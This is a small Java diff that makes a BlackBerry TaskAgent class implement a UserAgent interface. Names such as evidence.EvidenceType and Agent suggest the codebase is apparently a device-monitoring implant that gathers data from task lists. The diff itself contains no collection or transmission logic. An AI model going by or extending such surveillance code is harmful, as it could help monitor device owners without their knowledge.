@@ -28,13 +28,14 @@ import blackberry.debug.DebugLevel;
 import blackberry.evidence.EvidenceType;
 import blackberry.evidence.Markup;
 import blackberry.fs.Path;
+import blackberry.interfaces.UserAgent;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
 
 /**
  * The Class ImAgent.
  */
-public final class TaskAgent extends Agent implements PIMListListener {
+public final class TaskAgent extends Agent implements PIMListListener, UserAgent {
     //#ifdef DEBUG
     static Debug debug = new Debug("TaskAgent", DebugLevel.VERBOSE);
     //#endif
